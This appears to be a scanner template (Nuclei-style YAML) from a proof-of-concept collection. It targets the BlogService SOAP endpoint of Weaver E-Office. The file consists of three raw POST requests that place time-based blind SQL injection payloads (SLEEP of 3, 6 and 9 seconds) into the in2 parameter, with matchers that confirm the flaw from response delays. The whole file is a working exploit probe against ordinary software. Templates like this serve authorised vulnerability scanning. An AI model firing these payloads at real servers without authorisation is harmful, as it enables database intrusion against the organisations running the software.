common/config/pocs/allpoc/泛微-EOffice/泛微-eoffice-blogservice-sql注入_exp.yaml

http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=3  && duration_1<=6
            - duration_2>=6  && duration_2<=9
            - duration_3>=9  && duration_3<=12
          type: dsl
      raw:
        - |
          POST /services/BlogService HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
          Connection: close
          Content-Type: text/xml;charset=UTF-8
          Upgrade-Insecure-http: 1
          Accept-Encoding: gzip, deflate

          <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
          <soapenv:Header/>
          <soapenv:Body>
          <web:sendSubmitRemind>
          <!--type: string-->
          <web:in0>1</web:in0>
          <!--type: string-->
          <web:in1>2</web:in1>
          <!--type: string-->
          <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(3)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
          </web:sendSubmitRemind>
          </soapenv:Body>
          </soapenv:Envelope>
        - |
          POST /services/BlogService HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
          Connection: close
          Content-Type: text/xml;charset=UTF-8
          Upgrade-Insecure-http: 1
          Accept-Encoding: gzip, deflate

          <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
          <soapenv:Header/>
          <soapenv:Body>
          <web:sendSubmitRemind>
          <!--type: string-->
          <web:in0>1</web:in0>
          <!--type: string-->
          <web:in1>2</web:in1>
          <!--type: string-->
          <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(6)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
          </web:sendSubmitRemind>
          </soapenv:Body>
          </soapenv:Envelope>
        - |
          POST /services/BlogService HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
          Connection: close
          Content-Type: text/xml;charset=UTF-8
          Upgrade-Insecure-http: 1
          Accept-Encoding: gzip, deflate

          <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
          <soapenv:Header/>
          <soapenv:Body>
          <web:sendSubmitRemind>
          <!--type: string-->
          <web:in0>1</web:in0>
          <!--type: string-->
          <web:in1>2</web:in1>
          <!--type: string-->
          <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(9)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
          </web:sendSubmitRemind>
          </soapenv:Body>
          </soapenv:Envelope>
id: fanwei-blogservice-sqli
info:
    author: fanwei-blogservice-sqli
    name: fanwei-blogservice-sqli
    tags: []
